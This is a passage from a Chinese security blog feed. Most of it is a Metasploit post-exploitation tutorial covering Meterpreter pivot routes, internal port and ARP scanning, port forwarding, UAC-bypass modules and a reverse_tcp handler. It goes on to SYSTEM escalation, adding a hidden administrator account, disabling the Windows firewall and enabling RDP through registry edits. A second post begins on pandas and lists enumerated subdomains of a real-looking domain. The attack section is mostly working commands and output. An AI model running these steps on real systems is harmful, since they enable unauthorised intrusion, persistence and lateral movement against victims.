10.10.10.1/255.255.255.0</span></span><br><span class="line">[*]   run autoroute -s <span class="number">10.10</span><span class="number">.10</span><span class="number">.1</span>                 <span class="comment"># Netmask defaults to 255.255.255.0</span></span><br><span class="line">[*]   run autoroute -s <span class="number">10.10</span><span class="number">.10</span><span class="number">.1</span>/<span class="number">24</span>              <span class="comment"># CIDR notation is also okay</span></span><br><span class="line">[*]   run autoroute -p                            <span class="comment"># Print active routing table</span></span><br><span class="line">[*]   run autoroute -d -s <span class="number">10.10</span><span class="number">.10</span><span class="number">.1</span>              <span class="comment"># Deletes the 10.10.10.1/255.255.255.0 route</span></span><br><span class="line">[*] Use the <span class="string">&quot;route&quot;</span> <span class="keyword">and</span> <span class="string">&quot;ipconfig&quot;</span> Meterpreter commands to learn about available routes</span><br><span class="line">[-] Deprecation warning: This script has been replaced by the post/multi/manage/autoroute module</span><br></pre></td></tr></table></figure></li><li><p>获取目标内网地址段 </p><p>具体获取被攻击目标内网地址网段的命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run get_local_subnets</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span><br><span class="line">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span><br><span class="line">Local subnet: <span class="number">172.17</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">255.255</span><span class="number">.0</span><span class="number">.0</span></span><br></pre></td></tr></table></figure><p>由上可以获知，目标内网网段是“172.17.0.0./24”</p></li><li><p>添加去往目标网段的转发路由 </p><p>在meterpreter 会话上直接添加去往目标网段的路由，具体添加方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -s <span class="number">172.17</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">24</span></span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span><br><span class="line">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span><br><span class="line">[*] Adding a route to <span class="number">172.17</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span>...</span><br><span class="line">[+] Added route to <span class="number">172.17</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span> via <span class="number">10.48</span><span class="number">.8</span><span class="number">.234</span></span><br><span class="line">[*] Use the -p option to list all active routes</span><br></pre></td></tr></table></figure></li><li><p>添加网路由后，我们来查看下路由的添加情况如何</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -p</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span><br><span class="line">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span><br><span class="line"></span><br><span class="line">Active Routing Table</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">   Subnet             Netmask            Gateway</span><br><span class="line">   ------             -------            -------</span><br><span class="line">   <span class="number">172.17</span><span class="number">.0</span><span class="number">.0</span>         <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span>      Session <span class="number">3</span></span><br></pre></td></tr></table></figure></li></ul><p>将去往内网的路由打通后，接下来就可以使用MSF平台直接对内网主机扫描和进行各种高危漏洞的直接渗透利用了。</p><ul><li><p>删除路由</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -d -s 172.20.10.0</span><br></pre></td></tr></table></figure></li></ul><h4 id="autoroute模块"><a href="#autoroute模块" class="headerlink" title="autoroute模块"></a>autoroute模块</h4><h5 id="获取当前机器的所有网段信息"><a href="#获取当前机器的所有网段信息" class="headerlink" title="获取当前机器的所有网段信息"></a>获取当前机器的所有网段信息</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run get_local_subnets</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span><br><span class="line">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span><br><span class="line">Local subnet: <span class="number">10.10</span><span class="number">.10</span><span class="number">.0</span>/<span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br><span class="line">Local subnet: <span class="number">172.20</span><span class="number">.10</span><span class="number">.0</span>/<span class="number">255.255</span><span class="number">.255</span><span class="number">.240</span></span><br></pre></td></tr></table></figure><h5 id="添加目标内网网段的路由"><a href="#添加目标内网网段的路由" class="headerlink" title="添加目标内网网段的路由"></a>添加目标内网网段的路由</h5><figure class="highlight pascal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -s <span class="number">10.10</span>.<span class="number">10.0</span>/<span class="number">24</span></span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are <span class="keyword">deprecated</span>. <span class="keyword">Try</span> post/multi/manage/autoroute.</span><br><span class="line">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span><br><span class="line">[*] Adding a route <span class="keyword">to</span> <span class="number">10.10</span>.<span class="number">10.0</span>/<span class="number">255.255</span>.<span class="number">255.0</span>...</span><br><span class="line">[+] Added route <span class="keyword">to</span> <span class="number">10.10</span>.<span class="number">10.0</span>/<span class="number">255.255</span>.<span class="number">255.0</span> via <span class="number">172.20</span>.<span class="number">10.13</span></span><br><span class="line">[*] Use the -p option <span class="keyword">to</span> list all active routes</span><br></pre></td></tr></table></figure><h5 id="打印当前添加的路由表信息"><a href="#打印当前添加的路由表信息" class="headerlink" title="打印当前添加的路由表信息"></a>打印当前添加的路由表信息</h5><figure class="highlight pascal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -p</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are <span class="keyword">deprecated</span>. <span class="keyword">Try</span> post/multi/manage/autoroute.</span><br><span class="line">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span><br><span class="line"></span><br><span class="line">Active Routing Table</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">   Subnet             Netmask            Gateway</span><br><span class="line">   ------             -------            -------</span><br><span class="line">   <span class="number">10.10</span>.<span class="number">10.0</span>         <span class="number">255.255</span>.<span class="number">255.0</span>      Session <span class="number">4</span></span><br></pre></td></tr></table></figure><p>删除指定的路由</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -d -s 10.10.10.0&#x2F;24</span><br></pre></td></tr></table></figure><h4 id="内网主机发现"><a href="#内网主机发现" class="headerlink" title="内网主机发现"></a>内网主机发现</h4><p>进去内网之后，我们使用相关模块进行主机发现。</p><h5 id="TCP扫描"><a href="#TCP扫描" class="headerlink" title="TCP扫描"></a>TCP扫描</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi&#x2F;handler) &gt; use auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp</span><br><span class="line">msf5 auxiliary(scanner&#x2F;portscan&#x2F;tcp) &gt; show options</span><br><span class="line">msf5 auxiliary(scanner&#x2F;portscan&#x2F;tcp) &gt; set threads 10</span><br><span class="line">threads &#x3D;&gt; 10</span><br><span class="line">msf5 auxiliary(scanner&#x2F;portscan&#x2F;tcp) &gt; set RHOSTS 172.18.0.2-100</span><br><span class="line">RHOSTS &#x3D;&gt; 172.18.0.2-100</span><br><span class="line">msf5 auxiliary(scanner&#x2F;portscan&#x2F;tcp) &gt; set PORTS 3306,8022</span><br><span class="line">PORTS &#x3D;&gt; 3306,8022</span><br><span class="line">msf5 auxiliary(scanner&#x2F;portscan&#x2F;tcp) &gt; exploit</span><br><span class="line"></span><br><span class="line">[+] 172.18.0.3:           - 172.18.0.3:3306 - TCP OPEN</span><br><span class="line">[+] 172.18.0.2:           - 172.18.0.2:8022 - TCP OPEN</span><br><span class="line">[*] 172.18.0.2-100:       - Scanned 10 of 99 hosts (10% complete)</span><br></pre></td></tr></table></figure><h5 id="ARP扫描"><a href="#ARP扫描" class="headerlink" title="ARP扫描"></a>ARP扫描</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use post&#x2F;windows&#x2F;gather&#x2F;arp_scanner</span><br></pre></td></tr></table></figure><h4 id="Metasploit-Portfwd（端口转发-重定向）"><a href="#Metasploit-Portfwd（端口转发-重定向）" class="headerlink" title="Metasploit Portfwd（端口转发/重定向）"></a>Metasploit Portfwd（端口转发/重定向）</h4><p>在活动的Meterpreter会话中，键入<strong>portfwd -h</strong>将显示命令的各种选项和参数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd -h</span><br><span class="line">Usage: portfwd [-h] [add | delete | list | flush] [args]</span><br><span class="line">OPTIONS:</span><br><span class="line">     -L &gt;opt&gt;  要监听的本地主机（可选）。</span><br><span class="line">     -h        帮助横幅。</span><br><span class="line">     -l &gt;opt&gt;  要监听的本地端口。</span><br><span class="line">     -p &gt;opt&gt;  要连接的远程端口</span><br><span class="line">     -r &gt;opt&gt;  要连接的远程主机</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure><p>Options：选项</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-L：用于指定监听主机。 除非需要在特定网络适配器上进行转发，否则可以省略此选项。如果未输入任何值，则将使用0.0.0.0。</span><br><span class="line"></span><br><span class="line">-h：显示以上信息。</span><br><span class="line"></span><br><span class="line">-l：这是一个本地端口，它将在攻击机器上侦听。与此端口的连接将被转发到远程系统。</span><br><span class="line"></span><br><span class="line">-p：TCP连接将转发到的端口。</span><br><span class="line"></span><br><span class="line">-r：连接被中继到的IP地址（目标）。</span><br></pre></td></tr></table></figure><p> Arguments：参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Add：该参数用于创建转发。</span><br><span class="line"></span><br><span class="line">Delete：这将从我们的转发端口列表中删除先前的条目。</span><br><span class="line"></span><br><span class="line">List：这将列出当前转发的所有端口。</span><br><span class="line"></span><br><span class="line">Flush：这将删除我们的转发列表中的所有端口。</span><br></pre></td></tr></table></figure><p>例子：</p><p>Add参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd add –l 3389 –p 3389 –r  [target host]</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add会将端口转发添加到列表中，并将为我们创建一个隧道。请注意，此通道也将存在于Metasploit控制台之外，使其可用于任何终端会话。</span><br><span class="line">-l 3389是本地端口，将被监听并转发到我们的目标。这可以是您的机器上的任何端口，只要它尚未被使用。</span><br><span class="line">-p 3389是我们的定向主机上的目标端口。</span><br><span class="line">-r [target host]是我们的目标系统的IP或主机名。</span><br></pre></td></tr></table></figure><p>List参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd list</span><br><span class="line">0: 0.0.0.0:3389 -&gt; 172.16.194.191:3389</span><br><span class="line">1: 0.0.0.0:1337 -&gt; 172.16.194.191:1337</span><br><span class="line">2: 0.0.0.0:2222 -&gt; 172.16.194.191:2222</span><br><span class="line">3 total local port forwards.</span><br></pre></td></tr></table></figure><h4 id="Windows权限提升"><a href="#Windows权限提升" class="headerlink" title="Windows权限提升"></a>Windows权限提升</h4><ul><li><p>绕过UAC</p><p>bypassuac</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac</span><br><span class="line">或者</span><br><span class="line">msf5 &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_injection</span><br><span class="line">msf5 exploit(windows&#x2F;local&#x2F;bypassuac) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit&#x2F;windows&#x2F;local&#x2F;bypassuac):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   SESSION                     yes       The session to run this module on.</span><br><span class="line">   TECHNIQUE  EXE              yes       Technique to use if UAC is turned off (Accepted: PSH, EXE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows x86</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows&#x2F;local&#x2F;bypassuac) &gt;set target 1</span><br><span class="line">set target  1         #设置目标系统类型，1是64位，0是32位</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac  #该模块运行时会因为在目标机上创建多个文件而被杀毒软件识别，因此通过该模块提权成功率很低。</span><br><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_injection  #该模块直接运行在内存的反射DLL中，所以不会接触目标机器的硬盘，从而降低了被杀毒软件检测出来的概率。</span><br></pre></td></tr></table></figure><p>RunAs绕过</p><p>创建一个可执行文件，目标机会运行一个发起提升权限请求的程序，提示用户是否要继续运行，如果用户选择“是”，就会触发返回一个高权限的meterpreter shell。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit&#x2F;windows&#x2F;local&#x2F;ask</span><br><span class="line">msf5 exploit(windows&#x2F;local&#x2F;ask) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit&#x2F;windows&#x2F;local&#x2F;ask):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   FILENAME                    no        File name on disk</span><br><span class="line">   PATH                        no        Location on disk, %TEMP% used if not set</span><br><span class="line">   SESSION                     yes       The session to run this module on.</span><br><span class="line">   TECHNIQUE  EXE              yes       Technique to use (Accepted: PSH, EXE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows&#x2F;local&#x2F;ask) &gt;</span><br></pre></td></tr></table></figure></li></ul><h4 id="Windows渗透"><a href="#Windows渗透" class="headerlink" title="Windows渗透"></a>Windows渗透</h4><h5 id="cmd与3389"><a href="#cmd与3389" class="headerlink" title="cmd与3389"></a>cmd与3389</h5><ul><li>监听木马</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">msf5 post(multi&#x2F;manage&#x2F;autoroute) &gt; chcp 65001</span><br><span class="line">[-] Unknown command: chcp.</span><br><span class="line">msf5 post(multi&#x2F;manage&#x2F;autoroute) &gt; use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">payload &#x3D;&gt; windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set LHOST 172.20.10.3</span><br><span class="line">LHOST &#x3D;&gt; 172.20.10.3</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set LPORT 1234</span><br><span class="line">LPORT &#x3D;&gt; 1234</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 172.20.10.3:1234</span><br><span class="line">[*] Sending stage (176195 bytes) to 172.20.10.6</span><br><span class="line">[*] Meterpreter session 1 opened (172.20.10.3:1234 -&gt; 172.20.10.6:6198) at 2020-09-05 12:31:20 +0800</span><br></pre></td></tr></table></figure><ul><li>获取当前权限以及提权</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: GOD\Administrator</span><br><span class="line">meterpreter &gt; getsystem</span><br><span class="line">...got system via technique 1 (Named Pipe Impersonation (In Memory&#x2F;Admin)).</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure><p>切换cmdshell，注意切换之后cmdshell与msf的会话具有相同的权限</p><ul><li>添加用户并加入管理员组</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt;net user steady111 125219gxaGXA &#x2F;add</span><br><span class="line">net user steady111 125219gxaGXA &#x2F;add</span><br><span class="line">命令成功完成。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;net localgroup administrators steady111 &#x2F;add</span><br><span class="line">net localgroup administrators steady111 &#x2F;add</span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure><ul><li><p>开启关闭防火墙</p><p>windows2003之前</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">开启防火墙：</span><br><span class="line">netsh firewall set opmode mode&#x3D;enable</span><br><span class="line">关闭防火墙：</span><br><span class="line">netsh firewall set opmode mode&#x3D;disable</span><br></pre></td></tr></table></figure><p>windows2003之后</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure></li></ul><ul><li>开启3389</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f</span><br><span class="line"> </span><br><span class="line">REG ADD &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal&quot; 2&gt;&amp;1</span><br><span class="line"></span><br><span class="line">Server\WinStations\RDP-Tcp&quot; &#x2F;v PortNumber &#x2F;t REG_DWORD &#x2F;d 0x00000d3d &#x2F;f</span><br><span class="line">&quot; 2&gt;&amp;1</span><br></pre></td></tr></table></figure><ul><li>检查3389是否开放</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; &#x2F;v fDenyTSConnections</span><br><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server</span><br><span class="line"></span><br><span class="line">1表示关闭0表示开放</span><br><span class="line"></span><br><span class="line">fDenyTSConnections    REG_DWORD    0x1</span><br></pre></td></tr></table></figure><ul><li>查看远程桌面服务所在的端口</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; &#x2F;v PortNumber</span><br><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp</span><br></pre></td></tr></table></figure><h5 id="MSF与3389"><a href="#MSF与3389" class="headerlink" title="MSF与3389"></a>MSF与3389</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp  #开启远程桌面</span><br><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp USERNAME&#x3D;www2 PASSWORD&#x3D;123456 #添加用户</span><br><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp FORWARD&#x3D;true LPORT&#x3D;6662  #将3389端口转发到6662</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">portfwd add -l 6666 -p 3389 -r 127.0.0.1 #将目标机的3389端口转发到本地6666端口</span><br><span class="line">run getgui -f 6661 –e</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python学习--渗透测试小脚本</title>
      <link href="2020/11/11/Python%E5%AD%A6%E4%B9%A0--%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B0%8F%E8%84%9A%E6%9C%AC/"/>
      <url>2020/11/11/Python%E5%AD%A6%E4%B9%A0--%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B0%8F%E8%84%9A%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<h4 id="Python处理excel文档"><a href="#Python处理excel文档" class="headerlink" title="Python处理excel文档"></a>Python处理excel文档</h4><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200706131219279.png" alt="image-20200706131219279"></p><h5 id="pd-read-excel"><a href="#pd-read-excel" class="headerlink" title="pd.read_excel"></a>pd.read_excel</h5><h6 id="读取文件内容"><a href="#读取文件内容" class="headerlink" title="读取文件内容"></a>读取文件内容</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import pandas as pd</span><br><span class="line"></span><br><span class="line">content_list &#x3D; pd.read_excel(&quot;.&#x2F;52mf.com.xlsx&quot;)</span><br><span class="line">print(content_list)</span><br><span class="line"></span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;bin&#x2F;python3.7 &#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;code&#x2F;python&#x2F;数据处理&#x2F;获取子域名的url</span><br><span class="line">     id                                url  ... elapsed  count</span><br><span class="line">0     9                 http:&#x2F;&#x2F;52mf.com:80  ...     0.2      1</span><br><span class="line">1    43            http:&#x2F;&#x2F;mail.52mf.com:80  ...     2.5      2</span><br><span class="line">2    51          https:&#x2F;&#x2F;mail.52mf.com:443  ...     2.5      2</span><br><span class="line">3    60      http:&#x2F;&#x2F;renter-api.52mf.com:80  ...     2.6      3</span><br><span class="line">4    68    https:&#x2F;&#x2F;renter-api.52mf.com:443  ...     2.6      3</span><br><span class="line">5    77             http:&#x2F;&#x2F;www.52mf.com:80  ...     2.6      3</span><br><span class="line">6    85           https:&#x2F;&#x2F;www.52mf.com:443  ...     2.6      3</span><br><span class="line">7    94               http:&#x2F;&#x2F;m.52mf.com:80  ...     9.4      4</span><br><span class="line">8   102             https:&#x2F;&#x2F;m.52mf.com:443  ...     9.4      4</span><br><span class="line">9   111              http:&#x2F;&#x2F;oa.52mf.com:80  ...     9.4      4</span><br><span class="line">10  145             http:&#x2F;&#x2F;vpn.52mf.com:80  ...    None      1</span><br><span class="line">11  153           https:&#x2F;&#x2F;vpn.52mf.com:443  ...    None      1</span><br><span class="line">12  162            http:&#x2F;&#x2F;smtp.52mf.com:80  ...    None      2</span><br><span class="line">13  170          https:&#x2F;&#x2F;smtp.52mf.com:443  ...    None      2</span><br><span class="line">14  179        http:&#x2F;&#x2F;provider.52mf.com:80  ...    None      4</span><br><span class="line">15  196             http:&#x2F;&#x2F;pop.52mf.com:80  ...    None      5</span><br><span class="line">16  204           https:&#x2F;&#x2F;pop.52mf.com:443  ...    None      5</span><br><span class="line">17  230            http:&#x2F;&#x2F;imap.52mf.com:80  ...    None      7</span><br><span class="line">18  238          https:&#x2F;&#x2F;imap.52mf.com:443  ...    None      7</span><br><span class="line">19  281               http:&#x2F;&#x2F;s.52mf.com:80  ...    None     13</span><br><span class="line">20  289             https:&#x2F;&#x2F;s.52mf.com:443  ...    None     13</span><br><span class="line">21  315    http:&#x2F;&#x2F;autodiscover.52mf.com:80  ...    None     16</span><br><span class="line">22  323  https:&#x2F;&#x2F;autodiscover.52mf.com:443  ...    None     16</span><br></pre></td></tr></table></figure><h6 id="name-指定列名"><a href="#name-指定列名" class="headerlink" title="name:指定列名"></a>name:指定列名</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">值为list或者str，默认None，一般使用list传参&lt;br&gt;</span><br><span class="line">指定表头的名称，list内的值跟表的列数要一一对应，即不能多也不能少，多或者少都会抛出ValueError错误: Number of passed names did not match number of header fields in the file</span><br><span 